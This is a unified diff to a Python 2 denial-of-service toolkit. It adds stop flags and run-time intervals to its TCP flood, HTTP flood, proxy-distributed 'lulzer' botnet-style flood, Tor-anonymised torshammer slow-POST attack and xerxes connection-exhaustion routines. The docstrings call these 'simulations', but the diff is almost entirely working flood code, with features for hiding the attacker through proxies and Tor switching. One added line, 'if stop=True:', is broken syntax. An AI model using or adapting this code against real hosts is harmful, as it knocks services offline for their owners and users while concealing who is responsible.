@@ -85,11 +85,12 @@ def udp(u,port=80,ports=None,level=3,size=3,connection=True):
    except KeyboardInterrupt:
     break
    except Exception as e:
-    print e
+    pass
    time.sleep(t)
 class tcflood(threading.Thread):
  def run(self):
   global counter
+  global stop
   while True:
    try:
     s =socket.socket()
@@ -106,13 +107,21 @@ class tcflood(threading.Thread):
       s.send(m)
       counter+=1
       print"[!]Packets: {} | Bytes: {}".format(counter,len(m))
+      if stop==True: 
+            break
+     except KeyboardInterrupt:
+      stop=True
      except Exception as dx:
       pass
      time.sleep(speed)
     s.close()
+   except KeyboardInterrupt:
+      stop=True
    except Exception as e:
     pass
    time.sleep(.1)
+   if stop==True:
+    break
 '''
   usage:
 
@@ -124,7 +133,7 @@ class tcflood(threading.Thread):
   threads: (set by default to: 256) threads to use
   maxtime: (set by default to: 5) timeout flag
 '''
-def tcpflood(u,p=80,threads=256,maxtime=5,ampli=10,roundmin=5,roundmax=15,level=1):
+def tcpflood(u,p=80,threads=256,maxtime=5,ampli=10,roundmin=5,roundmax=15,level=1,interval=3600):
  global target
  target=u
  global port
@@ -155,9 +164,13 @@ def tcpflood(u,p=80,threads=256,maxtime=5,ampli=10,roundmin=5,roundmax=15,level=
  for x in range(threads):
   t=tcflood()
   t.start()
+ global stop
+ time.sleep(interval)
+ stop=True
 class htflood(threading.Thread):
  def run(self):
   global counter
+  global stop
   while True:
    try:
     s =socket.socket()
@@ -202,13 +215,21 @@ class htflood(threading.Thread):
       s.send(m)
       counter+=1
       print"[!]Request: {} | Type: {} | Bytes: {}".format(counter,req,len(m))
+      if stop==True: 
+            break
+     except KeyboardInterrupt:
+      stop=True
      except Exception as dx:
       pass
      time.sleep(speed)
     s.close()
+   except KeyboardInterrupt:
+      stop=True
    except Exception as e:
     pass
    time.sleep(.1)
+   if stop==True:
+    break
 '''
    the following functions and clases are for DoS attacks simulations with different tools that have been either originally written in 
    diffferent languages (Perl: slowloris and C: xerxes and slowread attack...) and rewritten in python and other python tools that are PoC for 
@@ -224,7 +245,7 @@ class htflood(threading.Thread):
 
    there will be lessons how to use them all don't worry guys xD
 '''
-def httpflood(u,p=80,threads=256,maxtime=5,ampli=15,roundmin=5,roundmax=15,level=1):
+def httpflood(u,p=80,threads=256,maxtime=5,ampli=15,roundmin=5,roundmax=15,level=1,interval=3600):
  '''
    this function is for http flood attack. it connect to a given port and flood it with http requests (GET & POST) with randomly headers values to make each request uniques with bypass caching engines techniques.
    it takes the following parameters:
@@ -270,9 +291,13 @@ def httpflood(u,p=80,threads=256,maxtime=5,ampli=15,roundmin=5,roundmax=15,level
  for x in range(threads):
   t=htflood()
   t.start()
+ global stop
+ time.sleep(interval)
+ stop=True
 class prflood(threading.Thread):
  def run(self):
   global counter
+  global stop
   while True:
    try:
     z=random.randint(1,20)
@@ -329,15 +354,22 @@ class prflood(threading.Thread):
       s.send(m)
       counter+=1
       print"[!]Bot: {} | Request: {} | Type: {} | Bytes: {}".format(ipp,counter,req,len(m))
+      if stop==True: 
+            break
+     except KeyboardInterrupt:
+      stop=True
      except Exception as dx:
       pass
      time.sleep(speed)
     s.close()
-    time.sleep(.1)
+   except KeyboardInterrupt:
+      stop=True
    except Exception as e:
     pass
    time.sleep(.1)
-def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,ampli=15,roundmin=5,roundmax=15,level=1):
+   if stop==True:
+    break
+def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,ampli=15,roundmin=5,roundmax=15,level=1,interval=3600):
  '''
    this function is for http flood attack but it distribute the around the world by passing the requests to thousands of proxies located in many countries (it is stimulation to real life botnet).
    it takes the following parameters:
@@ -401,8 +433,12 @@ def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,amp
  for x in range(threads):
   t=prflood()
   t.start()
+ global stop
+ time.sleep(interval)
+ stop=True
 class reqpost(threading.Thread):
  def run(self):
+  global stop
   while True:
    try:
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
@@ -421,14 +457,21 @@ class reqpost(threading.Thread):
       s.send(h)
       print"Posted: {}".format(h)
       time.sleep(random.uniform(.1,3))
-     except:
-      break
+      if stop==True: 
+       break
+     except KeyboardInterrupt:
+      stop=True
+     except Exception as dx:
+      pass
     s.close()
-    time.sleep(.1)
+   except KeyboardInterrupt:
+      stop=True
    except Exception as e:
     pass
    time.sleep(.1)
-def torshammer(u,p=80,threads=500,maxtime=5,settor=False):
+   if stop==True:
+    break
+def torshammer(u,p=80,threads=500,maxtime=5,settor=False,interval=3600):
  '''
     this function is used to do torshammer attack, it connects to an ip or domain with a specific port, sends a POST request with legit http headers values then sends the body slowly to keep the socket open as long as possible. it can use tor as a proxy to anonimize the attack. it supports ssl connections unlike the original tool and some bugs has been fixed and simplified.
     
@@ -459,6 +502,9 @@ def torshammer(u,p=80,threads=500,maxtime=5,settor=False):
  for x in range(threads):
      t =reqpost()
      t.start()
+ global stop
+ time.sleep(interval)
+ stop=True
 def torswitch1(new=30,logs=True):
   '''
     this function is for auto ip switching of tor's nodes, it doesnt work on windows because it use the command on linux to restart tor' service in a chosen interval.
@@ -509,6 +555,7 @@ def torswitch2(new=30,password=None,p=9051,logs=True):
 class xer(threading.Thread):
  def run(self):
   x=pointer
+  global stop
   while True:
    try:
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -519,13 +566,21 @@ class xer(threading.Thread):
      try:
       s.send("\x00")
       print"[{}: Voly sent]".format(x)
+      if stop==True:
+        break
+     except KeyboardInterrupt:
+      stop=True
      except Exception as e:
       break
      time.sleep(.2)
+   except KeyboardInterrupt:
+    stop=True
    except:
     pass
    time.sleep(.3)
-def xerxes(u,p=80,threads=500,maxtime=5):
+   if stop=True:
+    break
+def xerxes(u,p=80,threads=500,maxtime=5,interval=3600):
  '''
    everyone heard about the 'xerxes.c' tool ( https://github.com/zanyarjamal/xerxes/blob/master/xerxes.c ), but not everyone really understand what does it do exactly to take down targets, actually some has claimed that it sends few Gbps :/ (which is something really funny looool) . let me illuminate you: this tool is similar to slowloris, it consume all avaible connections on the server and keep them open as long as possible not by sending partial http headers slowly but by sending "NULL byte character" per connection every 0.3 seconds (so actually it doesn't really send much data). it uses 48 threads and 8 connections per thread, so the maximum number of connections that this tool can create is: 384 connections. that's why it works perfectly against apache for example (maximum number of connections that it handle simultaniously is 256 by dafault) but not against the ones with larger capacity.
 
@@ -556,6 +611,9 @@ def xerxes(u,p=80,threads=500,maxtime=5):
     t=xer()
     t.start()
     time.sleep(.001)
+ global stop
+ time.sleep(interval)
+ stop=True
 class slrd(threading.Thread):
  def run(self):
   while True:
